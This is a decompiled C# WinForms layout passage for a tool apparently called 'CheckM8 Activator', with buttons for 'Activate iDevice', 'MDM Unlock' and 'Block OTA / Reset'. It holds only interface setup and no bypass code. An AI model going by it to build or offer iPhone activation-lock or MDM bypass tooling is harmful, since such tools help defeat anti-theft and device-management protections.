			//IL_0113: Expected O, but got Unknown
			//IL_0114: Unknown result type (might be due to invalid IL or missing references)
			//IL_011e: Expected O, but got Unknown
			//IL_011f: Unknown result type (might be due to invalid IL or missing references)
			//IL_0129: Expected O, but got Unknown
			//IL_012a: Unknown result type (might be due to invalid IL or missing references)
			//IL_0134: Expected O, but got Unknown
			//IL_0135: Unknown result type (might be due to invalid IL or missing references)
			//IL_013f: Expected O, but got Unknown
			//IL_0140: Unknown result type (might be due to invalid IL or missing references)
			//IL_014a: Expected O, but got Unknown
			//IL_014b: Unknown result type (might be due to invalid IL or missing references)
			//IL_0155: Expected O, but got Unknown
			//IL_0198: Unknown result type (might be due to invalid IL or missing references)
			//IL_01a2: Expected O, but got Unknown
			//IL_01a3: Unknown result type (might be due to invalid IL or missing references)
			//IL_01ad: Expected O, but got Unknown
			//IL_0a56: Unknown result type (might be due to invalid IL or missing references)
			//IL_0bcc: Unknown result type (might be due to invalid IL or missing references)
			//IL_0fb3: Unknown result type (might be due to invalid IL or missing references)
			components = new Container();
			ComponentResourceManager resources = new ComponentResourceManager(typeof(Form1));
			labelType = new Label();
			labelVersion = new Label();
			labelSN = new Label();
			ModeloffHello = new Label();
			label15 = new Label();
			label16 = new Label();
			label20 = new Label();
			label23 = new Label();
			guna2GradientPanel3 = new Guna2GradientPanel();
			pictureBox4 = new PictureBox();
			pictureBox20 = new PictureBox();
			guna2CircleButton2 = new Guna2CircleButton();
			guna2CircleButton1 = new Guna2CircleButton();
			label1 = new Label();
			pictureBox1 = new PictureBox();
			guna2Elipse1 = new Guna2Elipse(components);
			guna2GradientButton3 = new Guna2GradientButton();
			guna2Panel1 = new Guna2Panel();
			Label10 = new Label();
			pictureBox6 = new PictureBox();
			label24 = new Label();
			pictureBox2 = new PictureBox();
			pictureBox3 = new PictureBox();
			pictureBox8 = new PictureBox();
			label2 = new Label();
			pictureBoxModel = new PictureBox();
			pictureBoxDC = new PictureBox();
			labelInfoProgres = new Label();
			Guna2Separator2 = new Guna2Separator();
			Guna2ProgressBar1 = new Guna2ProgressBar();
			ActivateButton = new Guna2GradientButton();
			guna2GradientButton1 = new Guna2GradientButton();
			Guna2Separator1 = new Guna2Separator();
			guna2GradientButton2 = new Guna2GradientButton();
			pictureBox5 = new PictureBox();
			label3 = new Label();
			((ISupportInitialize)pictureBox4).BeginInit();
			((ISupportInitialize)pictureBox20).BeginInit();
			((ISupportInitialize)pictureBox1).BeginInit();
			((Control)guna2Panel1).SuspendLayout();
			((ISupportInitialize)pictureBox6).BeginInit();
			((ISupportInitialize)pictureBox2).BeginInit();
			((ISupportInitialize)pictureBox3).BeginInit();
			((ISupportInitialize)pictureBox8).BeginInit();
			((ISupportInitialize)pictureBoxModel).BeginInit();
			((ISupportInitialize)pictureBoxDC).BeginInit();
			((ISupportInitialize)pictureBox5).BeginInit();
			((Control)this).SuspendLayout();
			((Control)labelType).AutoSize = true;
			((Control)labelType).BackColor = Color.Transparent;
			((Control)labelType).Font = new Font("Lucida Sans Unicode", 12f, FontStyle.Bold);
			((Control)labelType).ForeColor = Color.Black;
			((Control)labelType).Location = new Point(401, 80);
			((Control)labelType).Name = "labelType";
			((Control)labelType).Size = new Size(43, 20);
			((Control)labelType).TabIndex = 754;
			((Control)labelType).Text = "N/A";
			((Control)labelVersion).AutoSize = true;
			((Control)labelVersion).BackColor = Color.Transparent;
			labelVersion.FlatStyle = (FlatStyle)0;
			((Control)labelVersion).Font = new Font("Lucida Sans Unicode", 12f, FontStyle.Bold);
			((Control)labelVersion).ForeColor = Color.Black;
			((Control)labelVersion).Location = new Point(401, 140);
			((Control)labelVersion).Name = "labelVersion";
			((Control)labelVersion).Size = new Size(43, 20);
			((Control)labelVersion).TabIndex = 753;
			((Control)labelVersion).Text = "N/A";
			((Control)labelVersion).Click += (EventHandler)labelVersion_Click;
			((Control)labelSN).AutoSize = true;
			((Control)labelSN).BackColor = Color.Transparent;
			((Control)labelSN).Font = new Font("Lucida Sans Unicode", 12f, FontStyle.Bold);
			((Control)labelSN).ForeColor = Color.Black;
			((Control)labelSN).Location = new Point(401, 110);
			((Control)labelSN).Name = "labelSN";
			((Control)labelSN).Size = new Size(43, 20);
			((Control)labelSN).TabIndex = 751;
			((Control)labelSN).Text = "N/A";
			((Control)labelSN).Click += (EventHandler)labelSN_Click;
			((Control)ModeloffHello).AutoSize = true;
			((Control)ModeloffHello).BackColor = Color.Transparent;
			((Control)ModeloffHello).Font = new Font("Lucida Sans Unicode", 12f, FontStyle.Bold);
			((Control)ModeloffHello).ForeColor = Color.Black;
			((Control)ModeloffHello).Location = new Point(401, 50);
			((Control)ModeloffHello).Name = "ModeloffHello";
			((Control)ModeloffHello).Size = new Size(43, 20);
			((Control)ModeloffHello).TabIndex = 749;
			((Control)ModeloffHello).Text = "N/A";
			((Control)label15).AutoSize = true;
			((Control)label15).BackColor = Color.Transparent;
			((Control)label15).Font = new Font("Lucida Sans Unicode", 12f, FontStyle.Bold);
			((Control)label15).ForeColor = Color.Black;
			((Control)label15).Location = new Point(354, 140);
			((Control)label15).Name = "label15";
			((Control)label15).Size = new Size(50, 20);
			((Control)label15).TabIndex = 748;
			((Control)label15).Text = "iOS :";
			((Control)label16).AutoSize = true;
			((Control)label16).BackColor = Color.Transparent;
			((Control)label16).Font = new Font("Lucida Sans Unicode", 12f, FontStyle.Bold);
			((Control)label16).ForeColor = Color.Black;
			((Control)label16).Location = new Point(322, 80);
			((Control)label16).Name = "label16";
			((Control)label16).Size = new Size(82, 20);
			((Control)label16).TabIndex = 747;
			((Control)label16).Text = "MODEL :";
			((Control)label16).Click += (EventHandler)label16_Click;
			((Control)label20).AutoSize = true;
			((Control)label20).BackColor = Color.Transparent;
			((Control)label20).Font = new Font("Lucida Sans Unicode", 12f, FontStyle.Bold);
			((Control)label20).ForeColor = Color.Black;
			((Control)label20).Location = new Point(351, 110);
			((Control)label20).Name = "label20";
			((Control)label20).Size = new Size(53, 20);
			((Control)label20).TabIndex = 744;
			((Control)label20).Text = "S/N :";
			((Control)label20).Click += (EventHandler)label20_Click;
			((Control)label23).AutoSize = true;
			((Control)label23).BackColor = Color.Transparent;
			((Control)label23).Font = new Font("Lucida Sans Unicode", 12f, FontStyle.Bold);
			((Control)label23).ForeColor = Color.Black;
			((Control)label23).Location = new Point(321, 50);
			((Control)label23).Name = "label23";
			((Control)label23).Size = new Size(83, 20);
			((Control)label23).TabIndex = 743;
			((Control)label23).Text = "DEVICE :";
			((Control)guna2GradientPanel3).BackColor = Color.White;
			((Control)guna2GradientPanel3).BackgroundImageLayout = (ImageLayout)3;
			guna2GradientPanel3.FillColor = Color.FromArgb(32, 32, 32);
			guna2GradientPanel3.FillColor2 = Color.FromArgb(32, 32, 32);
			((Control)guna2GradientPanel3).ForeColor = Color.Transparent;
			((Control)guna2GradientPanel3).Location = new Point(801, -6);
			((Control)guna2GradientPanel3).Name = "guna2GradientPanel3";
			((Control)guna2GradientPanel3).Size = new Size(88, 49);
			((Control)guna2GradientPanel3).TabIndex = 783;
			((Control)pictureBox4).BackColor = Color.Transparent;
			pictureBox4.Image = (Image)Titan.Properties.Resources.Header_WindowsDesign;
			((Control)pictureBox4).Location = new Point(881, 278);
			((Control)pictureBox4).Name = "pictureBox4";
			((Control)pictureBox4).Size = new Size(227, 25);
			pictureBox4.SizeMode = (PictureBoxSizeMode)4;
			pictureBox4.TabIndex = 817;
			pictureBox4.TabStop = false;
			((Control)pictureBox20).BackColor = Color.Transparent;
			pictureBox20.Image = (Image)Titan.Properties.Resources.telegram_app_50px;
			((Control)pictureBox20).Location = new Point(664, 33);
			((Control)pictureBox20).Name = "pictureBox20";
			((Control)pictureBox20).Size = new Size(36, 35);
			pictureBox20.SizeMode = (PictureBoxSizeMode)4;
			pictureBox20.TabIndex = 798;
			pictureBox20.TabStop = false;
			((Control)pictureBox20).Click += (EventHandler)pictureBox20_Click;
			((Control)guna2CircleButton2).BackColor = Color.Transparent;
			guna2CircleButton2.DisabledState.BorderColor = Color.DarkGray;
			guna2CircleButton2.DisabledState.CustomBorderColor = Color.DarkGray;
			guna2CircleButton2.DisabledState.FillColor = Color.FromArgb(169, 169, 169);
			guna2CircleButton2.DisabledState.ForeColor = Color.FromArgb(141, 141, 141);
			guna2CircleButton2.FillColor = Color.FromArgb(255, 194, 11);
			((Control)guna2CircleButton2).Font = new Font("Segoe UI", 9f);
			((Control)guna2CircleButton2).ForeColor = Color.White;
			((Control)guna2CircleButton2).Location = new Point(877, 76);
			((Control)guna2CircleButton2).Margin = new Padding(2);
			((Control)guna2CircleButton2).Name = "guna2CircleButton2";
			guna2CircleButton2.ShadowDecoration.Depth = 3;
			guna2CircleButton2.ShadowDecoration.Enabled = true;
			guna2CircleButton2.ShadowDecoration.Mode = ShadowMode.Circle;
			((Control)guna2CircleButton2).Size = new Size(190, 125);
			((Control)guna2CircleButton2).TabIndex = 745;
			((Control)guna2CircleButton2).Text = "guna2CircleButton2";
			((Control)guna2CircleButton2).Click += (EventHandler)guna2CircleButton2_Click;
			((Control)guna2CircleButton1).BackColor = Color.Transparent;
			guna2CircleButton1.DisabledState.BorderColor = Color.DarkGray;
			guna2CircleButton1.DisabledState.CustomBorderColor = Color.DarkGray;
			guna2CircleButton1.DisabledState.FillColor = Color.FromArgb(169, 169, 169);
			guna2CircleButton1.DisabledState.ForeColor = Color.FromArgb(141, 141, 141);
			guna2CircleButton1.FillColor = Color.IndianRed;
			((Control)guna2CircleButton1).Font = new Font("Segoe UI", 12f, FontStyle.Bold);
			((Control)guna2CircleButton1).ForeColor = Color.White;
			((Control)guna2CircleButton1).Location = new Point(704, 34);
			((Control)guna2CircleButton1).Margin = new Padding(2);
			((Control)guna2CircleButton1).Name = "guna2CircleButton1";
			guna2CircleButton1.ShadowDecoration.Depth = 3;
			guna2CircleButton1.ShadowDecoration.Enabled = true;
			guna2CircleButton1.ShadowDecoration.Mode = ShadowMode.Circle;
			((Control)guna2CircleButton1).Size = new Size(32, 32);
			((Control)guna2CircleButton1).TabIndex = 744;
			((Control)guna2CircleButton1).Text = "X";
			((Control)guna2CircleButton1).Click += (EventHandler)guna2CircleButton1_Click;
			((Control)label1).BackColor = Color.Transparent;
			((Control)label1).Font = new Font("Segoe UI", 29f, FontStyle.Bold);
			((Control)label1).ForeColor = Color.FromArgb(64, 0, 0);
			((Control)label1).Location = new Point(0, 144);
			((Control)label1).Name = "label1";
			((Control)label1).Size = new Size(228, 50);
			((Control)label1).TabIndex = 818;
			((Control)label1).Text = " rhcp011235.";
			label1.TextAlign = ContentAlignment.MiddleCenter;
			((Control)label1).Click += (EventHandler)label1_Click;
			((Control)pictureBox1).BackColor = Color.Transparent;
			pictureBox1.Image = (Image)Titan.Properties.Resources.logo1;
			((Control)pictureBox1).Location = new Point(0, 0);
			((Control)pictureBox1).Name = "pictureBox1";
			((Control)pictureBox1).Size = new Size(228, 152);
			pictureBox1.SizeMode = (PictureBoxSizeMode)4;
			pictureBox1.TabIndex = 798;
			pictureBox1.TabStop = false;
			guna2Elipse1.BorderRadius = 15;
			guna2Elipse1.TargetControl = (Control)(object)this;
			guna2GradientButton3.Animated = true;
			((Control)guna2GradientButton3).BackColor = Color.Transparent;
			guna2GradientButton3.BorderColor = Color.Transparent;
			guna2GradientButton3.BorderRadius = 3;
			guna2GradientButton3.BorderStyle = DashStyle.Dash;
			guna2GradientButton3.DisabledState.BorderColor = Color.DarkGray;
			guna2GradientButton3.DisabledState.CustomBorderColor = Color.DarkGray;
			guna2GradientButton3.DisabledState.FillColor = Color.FromArgb(169, 169, 169);
			guna2GradientButton3.DisabledState.FillColor2 = Color.FromArgb(169, 169, 169);
			guna2GradientButton3.DisabledState.ForeColor = Color.FromArgb(141, 141, 141);
			guna2GradientButton3.FillColor = Color.Transparent;
			guna2GradientButton3.FillColor2 = Color.Transparent;
			((Control)guna2GradientButton3).Font = new Font("Lucida Sans Unicode", 9.25f, FontStyle.Bold);
			((Control)guna2GradientButton3).ForeColor = SystemColors.WindowText;
			guna2GradientButton3.GradientMode = LinearGradientMode.ForwardDiagonal;
			guna2GradientButton3.Image = Titan.Properties.Resources.icons8_anydesk_48;
			guna2GradientButton3.ImageAlign = (HorizontalAlignment)0;
			guna2GradientButton3.ImageSize = new Size(30, 30);
			guna2GradientButton3.IndicateFocus = true;
			((Control)guna2GradientButton3).Location = new Point(886, 313);
			((Control)guna2GradientButton3).Name = "guna2GradientButton3";
			guna2GradientButton3.PressedColor = Color.Transparent;
			((Control)guna2GradientButton3).RightToLeft = (RightToLeft)1;
			guna2GradientButton3.ShadowDecoration.BorderRadius = 2;
			guna2GradientButton3.ShadowDecoration.Depth = 2;
			guna2GradientButton3.ShadowDecoration.Enabled = true;
			guna2GradientButton3.ShadowDecoration.Shadow = new Padding(2);
			((Control)guna2GradientButton3).Size = new Size(171, 32);
			((Control)guna2GradientButton3).TabIndex = 807;
			guna2GradientButton3.UseTransparentBackground = true;
			((Control)guna2GradientButton3).Click += (EventHandler)guna2GradientButton3_Click_1;
			((Control)guna2Panel1).BackColor = Color.Transparent;
			((Control)guna2Panel1).Controls.Add((Control)(object)label20);
			((Control)guna2Panel1).Controls.Add((Control)(object)labelType);
			((Control)guna2Panel1).Controls.Add((Control)(object)label16);
			((Control)guna2Panel1).Controls.Add((Control)(object)ModeloffHello);
			((Control)guna2Panel1).Controls.Add((Control)(object)label23);
			((Control)guna2Panel1).Controls.Add((Control)(object)labelSN);
			((Control)guna2Panel1).Controls.Add((Control)(object)labelVersion);
			((Control)guna2Panel1).Controls.Add((Control)(object)Label10);
			((Control)guna2Panel1).Controls.Add((Control)(object)pictureBox1);
			((Control)guna2Panel1).Controls.Add((Control)(object)pictureBox6);
			((Control)guna2Panel1).Controls.Add((Control)(object)label24);
			((Control)guna2Panel1).Controls.Add((Control)(object)pictureBox2);
			((Control)guna2Panel1).Controls.Add((Control)(object)label15);
			((Control)guna2Panel1).Controls.Add((Control)(object)pictureBox3);
			((Control)guna2Panel1).Controls.Add((Control)(object)pictureBox8);
			((Control)guna2Panel1).Controls.Add((Control)(object)label1);
			((Control)guna2Panel1).Controls.Add((Control)(object)label2);
			((Control)guna2Panel1).Location = new Point(18, 50);
			((Control)guna2Panel1).Name = "guna2Panel1";
			((Control)guna2Panel1).Size = new Size(748, 210);
			((Control)guna2Panel1).TabIndex = 788;
			guna2Panel1.UseTransparentBackground = true;
			((Control)Label10).AutoSize = true;
			((Control)Label10).BackColor = Color.Transparent;
			((Control)Label10).Font = new Font("Segoe UI Semibold", 8f, FontStyle.Bold);
			((Control)Label10).ForeColor = Color.Black;
			((Control)Label10).Location = new Point(547, 18);
			((Control)Label10).Name = "Label10";
			((Control)Label10).Size = new Size(0, 13);
			((Control)Label10).TabIndex = 816;
			((Control)pictureBox6).BackColor = Color.Transparent;
			((Control)pictureBox6).Cursor = Cursors.Hand;
			pictureBox6.Image = (Image)Titan.Properties.Resources.Cn;
			((Control)pictureBox6).Location = new Point(56, 30);
			((Control)pictureBox6).Name = "pictureBox6";
			((Control)pictureBox6).Size = new Size(19, 17);
			pictureBox6.SizeMode = (PictureBoxSizeMode)4;
			pictureBox6.TabIndex = 797;
			pictureBox6.TabStop = false;
			((Control)label24).AutoSize = true;
			((Control)label24).BackColor = Color.Transparent;
			((Control)label24).Font = new Font("Segoe UI Semibold", 8f, FontStyle.Bold);
			((Control)label24).ForeColor = Color.Black;
			((Control)label24).Location = new Point(92, 63);
			((Control)label24).Name = "label24";
			((Control)label24).Size = new Size(0, 13);
			((Control)label24).TabIndex = 814;
			((Control)pictureBox2).BackColor = Color.Transparent;
			((Control)pictureBox2).Cursor = Cursors.Hand;
			pictureBox2.Image = (Image)Titan.Properties.Resources.Cn;
			((Control)pictureBox2).Location = new Point(81, 18);
			((Control)pictureBox2).Name = "pictureBox2";
			((Control)pictureBox2).Size = new Size(19, 17);
			pictureBox2.SizeMode = (PictureBoxSizeMode)4;
			pictureBox2.TabIndex = 760;
			pictureBox2.TabStop = false;
			((Control)pictureBox3).BackColor = Color.Transparent;
			((Control)pictureBox3).Cursor = Cursors.Hand;
			pictureBox3.Image = (Image)Titan.Properties.Resources.Cn;
			((Control)pictureBox3).Location = new Point(69, 18);
			((Control)pictureBox3).Name = "pictureBox3";
			((Control)pictureBox3).Size = new Size(19, 17);
			pictureBox3.SizeMode = (PictureBoxSizeMode)4;
			pictureBox3.TabIndex = 759;
			pictureBox3.TabStop = false;
			((Control)pictureBox3).Click += (EventHandler)pictureBox3_Click;
			((Control)pictureBox8).BackColor = Color.Transparent;
			((Control)pictureBox8).Cursor = Cursors.Hand;
			pictureBox8.Image = (Image)Titan.Properties.Resources.Cn;
			((Control)pictureBox8).Location = new Point(44, 30);
			((Control)pictureBox8).Name = "pictureBox8";
			((Control)pictureBox8).Size = new Size(19, 17);
			pictureBox8.SizeMode = (PictureBoxSizeMode)4;
			pictureBox8.TabIndex = 757;
			pictureBox8.TabStop = false;
			((Control)pictureBox8).Click += (EventHandler)pictureBox8_Click;
			((Control)label2).BackColor = Color.Transparent;
			((Control)label2).Font = new Font("Lucida Sans Unicode", 10f, FontStyle.Bold);
			((Control)label2).ForeColor = Color.Indigo;
			((Control)label2).Location = new Point(0, 185);
			((Control)label2).Name = "label2";
			((Control)label2).Size = new Size(228, 29);
			((Control)label2).TabIndex = 821;
			((Control)label2).Text = "CheckM8 Activator";
			label2.TextAlign = ContentAlignment.MiddleCenter;
			((Control)label2).Click += (EventHandler)label2_Click;
			((Control)pictureBoxModel).BackColor = Color.Transparent;
			pictureBoxModel.Image = (Image)Titan.Properties.Resources.device_recovery;
			((Control)pictureBoxModel).Location = new Point(1002, 131);
			((Control)pictureBoxModel).Name = "pictureBoxModel";
			((Control)pictureBoxModel).Size = new Size(179, 209);
			pictureBoxModel.SizeMode = (PictureBoxSizeMode)4;
			pictureBoxModel.TabIndex = 674;
			pictureBoxModel.TabStop = false;
			((Control)pictureBoxDC).BackColor = Color.Transparent;
			pictureBoxDC.Image = (Image)Titan.Properties.Resources.device_recovery;
			((Control)pictureBoxDC).Location = new Point(846, 136);
			((Control)pictureBoxDC).Name = "pictureBoxDC";
			((Control)pictureBoxDC).Size = new Size(249, 209);
			pictureBoxDC.SizeMode = (PictureBoxSizeMode)4;
			pictureBoxDC.TabIndex = 777;
			pictureBoxDC.TabStop = false;
			((Control)labelInfoProgres).BackColor = Color.Transparent;
			((Control)labelInfoProgres).Font = new Font("Segoe UI", 9f, FontStyle.Bold, GraphicsUnit.Point, 0);
			((Control)labelInfoProgres).ForeColor = Color.Black;
			((Control)labelInfoProgres).Location = new Point(15, 348);
			((Control)labelInfoProgres).Name = "labelInfoProgres";
			((Control)labelInfoProgres).Size = new Size(751, 18);
			((Control)labelInfoProgres).TabIndex = 811;
			((Control)labelInfoProgres).Text = "...";
			labelInfoProgres.TextAlign = ContentAlignment.MiddleCenter;
			((Control)labelInfoProgres).Click += (EventHandler)labelInfoProgres_Click;
			((Control)Guna2Separator2).BackColor = Color.Transparent;
			Guna2Separator2.FillThickness = 2;
			((Control)Guna2Separator2).Location = new Point(859, 33);
			((Control)Guna2Separator2).Name = "Guna2Separator2";
			((Control)Guna2Separator2).Size = new Size(70, 24);
			((Control)Guna2Separator2).TabIndex = 815;
			((Control)Guna2ProgressBar1).BackColor = Color.Transparent;
			Guna2ProgressBar1.BorderRadius = 2;
			Guna2ProgressBar1.FillColor = Color.LightGray;
			((Control)Guna2ProgressBar1).ForeColor = Color.Transparent;
			((Control)Guna2ProgressBar1).Location = new Point(18, 321);
			Guna2ProgressBar1.Minimum = 10;
			((Control)Guna2ProgressBar1).Name = "Guna2ProgressBar1";
			Guna2ProgressBar1.ProgressColor = Color.SpringGreen;
			Guna2ProgressBar1.ProgressColor2 = Color.RoyalBlue;
			Guna2ProgressBar1.ShadowDecoration.BorderRadius = 4;
			Guna2ProgressBar1.ShadowDecoration.Depth = 6;
			Guna2ProgressBar1.ShadowDecoration.Enabled = true;
			((Control)Guna2ProgressBar1).Size = new Size(748, 20);
			((Control)Guna2ProgressBar1).TabIndex = 816;
			Guna2ProgressBar1.TextRenderingHint = TextRenderingHint.SystemDefault;
			Guna2ProgressBar1.Value = 100;
			Guna2ProgressBar1.ValueChanged += Guna2ProgressBar1_ValueChanged;
			ActivateButton.Animated = true;
			((Control)ActivateButton).BackColor = Color.Transparent;
			ActivateButton.BorderColor = Color.Transparent;
			ActivateButton.BorderRadius = 5;
			ActivateButton.BorderStyle = DashStyle.Dash;
			ActivateButton.DisabledState.BorderColor = Color.DarkGray;
			ActivateButton.DisabledState.CustomBorderColor = Color.DarkGray;
			ActivateButton.DisabledState.FillColor = Color.FromArgb(169, 169, 169);
			ActivateButton.DisabledState.FillColor2 = Color.FromArgb(169, 169, 169);
			ActivateButton.DisabledState.ForeColor = Color.FromArgb(141, 141, 141);
			ActivateButton.FillColor = Color.FromArgb(55, 55, 55);
			ActivateButton.FillColor2 = Color.FromArgb(55, 55, 55);
			((Control)ActivateButton).Font = new Font("Lucida Sans Unicode", 9.25f, FontStyle.Bold);
			((Control)ActivateButton).ForeColor = Color.GhostWhite;
			ActivateButton.GradientMode = LinearGradientMode.ForwardDiagonal;
			ActivateButton.Image = Titan.Properties.Resources.smartphone_approve_50px;
			ActivateButton.ImageAlign = (HorizontalAlignment)0;
			ActivateButton.ImageSize = new Size(25, 25);
			ActivateButton.IndicateFocus = true;
			((Control)ActivateButton).Location = new Point(18, 278);
			((Control)ActivateButton).Name = "ActivateButton";
			ActivateButton.PressedColor = Color.Transparent;
			ActivateButton.ShadowDecoration.BorderRadius = 4;
			ActivateButton.ShadowDecoration.Depth = 6;
			ActivateButton.ShadowDecoration.Enabled = true;
			((Control)ActivateButton).Size = new Size(748, 34);
			((Control)ActivateButton).TabIndex = 817;
			((Control)ActivateButton).Text = " Activate iDevice";
			ActivateButton.UseTransparentBackground = true;
			((Control)ActivateButton).Click += (EventHandler)ActivateButton_Click;
			guna2GradientButton1.Animated = true;
			((Control)guna2GradientButton1).BackColor = Color.Transparent;
			guna2GradientButton1.BorderColor = Color.Transparent;
			guna2GradientButton1.BorderRadius = 3;
			guna2GradientButton1.BorderStyle = DashStyle.Dash;
			guna2GradientButton1.DisabledState.BorderColor = Color.DarkGray;
			guna2GradientButton1.DisabledState.CustomBorderColor = Color.DarkGray;
			guna2GradientButton1.DisabledState.FillColor = Color.FromArgb(169, 169, 169);
			guna2GradientButton1.DisabledState.FillColor2 = Color.FromArgb(169, 169, 169);
			guna2GradientButton1.DisabledState.ForeColor = Color.FromArgb(141, 141, 141);
			guna2GradientButton1.FillColor = Color.FromArgb(55, 55, 55);
			guna2GradientButton1.FillColor2 = Color.FromArgb(55, 55, 55);
			((Control)guna2GradientButton1).Font = new Font("Lucida Sans Unicode", 9.25f, FontStyle.Bold);
			((Control)guna2GradientButton1).ForeColor = Color.GhostWhite;
			guna2GradientButton1.GradientMode = LinearGradientMode.ForwardDiagonal;
			guna2GradientButton1.Image = Titan.Properties.Resources.icons8_unlock_32;
			guna2GradientButton1.ImageAlign = (HorizontalAlignment)0;
			guna2GradientButton1.ImageSize = new Size(25, 25);
			guna2GradientButton1.IndicateFocus = true;
			((Control)guna2GradientButton1).Location = new Point(954, 293);
			((Control)guna2GradientButton1).Name = "guna2GradientButton1";
			guna2GradientButton1.PressedColor = Color.Transparent;
			guna2GradientButton1.ShadowDecoration.BorderRadius = 4;
			guna2GradientButton1.ShadowDecoration.Depth = 6;
			guna2GradientButton1.ShadowDecoration.Enabled = true;
			((Control)guna2GradientButton1).Size = new Size(139, 34);
			((Control)guna2GradientButton1).TabIndex = 818;
			((Control)guna2GradientButton1).Text = " MDM Unlock";
			guna2GradientButton1.UseTransparentBackground = true;
			((Control)guna2GradientButton1).Click += (EventHandler)guna2GradientButton1_Click_1;
			((Control)Guna2Separator1).BackColor = Color.Transparent;
			Guna2Separator1.FillThickness = 2;
			((Control)Guna2Separator1).Location = new Point(-9, 262);
			((Control)Guna2Separator1).Name = "Guna2Separator1";
			((Control)Guna2Separator1).Size = new Size(793, 10);
			((Control)Guna2Separator1).TabIndex = 819;
			guna2GradientButton2.Animated = true;
			((Control)guna2GradientButton2).BackColor = Color.Transparent;
			guna2GradientButton2.BorderColor = Color.Transparent;
			guna2GradientButton2.BorderRadius = 3;
			guna2GradientButton2.BorderStyle = DashStyle.Dash;
			guna2GradientButton2.DisabledState.BorderColor = Color.DarkGray;
			guna2GradientButton2.DisabledState.CustomBorderColor = Color.DarkGray;
			guna2GradientButton2.DisabledState.FillColor = Color.FromArgb(169, 169, 169);
			guna2GradientButton2.DisabledState.FillColor2 = Color.FromArgb(169, 169, 169);
			guna2GradientButton2.DisabledState.ForeColor = Color.FromArgb(141, 141, 141);
			guna2GradientButton2.FillColor = Color.FromArgb(55, 55, 55);
			guna2GradientButton2.FillColor2 = Color.FromArgb(55, 55, 55);
			((Control)guna2GradientButton2).Font = new Font("Lucida Sans Unicode", 9.25f, FontStyle.Bold);
			((Control)guna2GradientButton2).ForeColor = Color.GhostWhite;
			guna2GradientButton2.GradientMode = LinearGradientMode.ForwardDiagonal;
			guna2GradientButton2.Image = Titan.Properties.Resources.icons8_unlock_32;
			guna2GradientButton2.ImageAlign = (HorizontalAlignment)0;
			guna2GradientButton2.ImageSize = new Size(25, 25);
			guna2GradientButton2.IndicateFocus = true;
			((Control)guna2GradientButton2).Location = new Point(857, 278);
			((Control)guna2GradientButton2).Name = "guna2GradientButton2";
			guna2GradientButton2.PressedColor = Color.Transparent;
			guna2GradientButton2.ShadowDecoration.BorderRadius = 4;
			guna2GradientButton2.ShadowDecoration.Depth = 6;
			guna2GradientButton2.ShadowDecoration.Enabled = true;
			((Control)guna2GradientButton2).Size = new Size(258, 34);
			((Control)guna2GradientButton2).TabIndex = 820;
			((Control)guna2GradientButton2).Text = "Block OTA / Reset";
			guna2GradientButton2.UseTransparentBackground = true;
			((Control)guna2GradientButton2).Click += (EventHandler)guna2GradientButton2_Click;
			((Control)pictureBox5).BackColor = Color.Transparent;
			pictureBox5.Image = (Image)Titan.Properties.Resources.empty_transparent;
			((Control)pictureBox5).Location = new Point(-3, -6);
			((Control)pictureBox5).Name = "pictureBox5";
			((Control)pictureBox5).Size = new Size(249, 236);
			pictureBox5.SizeMode = (PictureBoxSizeMode)4;
			pictureBox5.TabIndex = 821;
			pictureBox5.TabStop = false;
			((Control)pictureBox5).Click += (EventHandler)pictureBox5_Click;
			((Control)label3).BackColor = Color.Transparent;
			((Control)label3).Font = new Font("Lucida Sans Unicode", 8f, FontStyle.Bold);
			((Control)label3).ForeColor = Color.Black;
			((Control)label3).Location = new Point(733, 350);
			((Control)label3).Name = "label3";
			((Control)label3).Size = new Size(35, 16);
			((Control)label3).TabIndex = 822;
			((Control)label3).Text = "v0.2";
			label3.TextAlign = ContentAlignment.MiddleCenter;
			((ContainerControl)this).AutoScaleDimensions = new SizeF(6f, 13f);
			((ContainerControl)this).AutoScaleMode = (AutoScaleMode)1;
			((Control)this).BackColor = Color.FromArgb(32, 32, 32);
			((Control)this).BackgroundImage = (Image)Titan.Properties.Resources.rsz_iphone_x_stock_22_09_2024_1727057375_hd_wallpaper;
			((Control)this).BackgroundImageLayout = (ImageLayout)2;
			((Form)this).ClientSize = new Size(780, 372);
			((Control)this).Controls.Add((Control)(object)label3);
			((Control)this).Controls.Add((Control)(object)pictureBox20);
			((Control)this).Controls.Add((Control)(object)pictureBox4);
			((Control)this).Controls.Add((Control)(object)guna2CircleButton2);
			((Control)this).Controls.Add((Control)(object)guna2CircleButton1);
			((Control)this).Controls.Add((Control)(object)guna2GradientButton2);
			((Control)this).Controls.Add((Control)(object)Guna2Separator1);
			((Control)this).Controls.Add((Control)(object)guna2GradientButton1);
			((Control)this).Controls.Add((Control)(object)ActivateButton);
			((Control)this).Controls.Add((Control)(object)Guna2ProgressBar1);
			((Control)this).Controls.Add((Control)(object)guna2GradientButton3);
			((Control)this).Controls.Add((Control)(object)guna2GradientPanel3);
			((Control)this).Controls.Add((Control)(object)guna2Panel1);
			((Control)this).Controls.Add((Control)(object)labelInfoProgres);
			((Control)this).Controls.Add((Control)(object)pictureBoxModel);
			((Control)this).Controls.Add((Control)(object)Guna2Separator2);
			((Control)this).Controls.Add((Control)(object)pictureBoxDC);
			((Control)this).Controls.Add((Control)(object)pictureBox5);
			((Control)this).ForeColor = Color.White;
			((Form)this).FormBorderStyle = (FormBorderStyle)0;
			((Form)this).Icon = Icon.ExtractAssociatedIcon(Application.ExecutablePath);
			((Form)this).MaximizeBox = false;
			((Form)this).MinimizeBox = false;
			((Control)this).Name = "Form1";
			((Form)this).StartPosition = (FormStartPosition)1;
			((Control)this).Text = "rhcp011235";
			((Form)this).Load += (EventHandler)Form1_Load;
			((ISupportInitialize)pictureBox4).EndInit();
			((ISupportInitialize)pictureBox20).EndInit();
			((ISupportInitialize)pictureBox1).EndInit();
			((Control)guna2Panel1).ResumeLayout(false);
			((Control)guna2Panel1).PerformLayout();
			((ISupportInitialize)pictureBox6).EndInit();
			((ISupportInitialize)pictureBox2).EndInit();
			((ISupportInitialize)pictureBox3).EndInit();
			((ISupportInitialize)pictureBox8).EndInit();
			((ISupportInitialize)pictureBoxModel).EndInit();
			((ISupportInitialize)pictureBoxDC).EndInit();
			((ISupportInitialize)pictureBox5).EndInit();
			((Control)this).ResumeLayout(false);
		}
	}
}
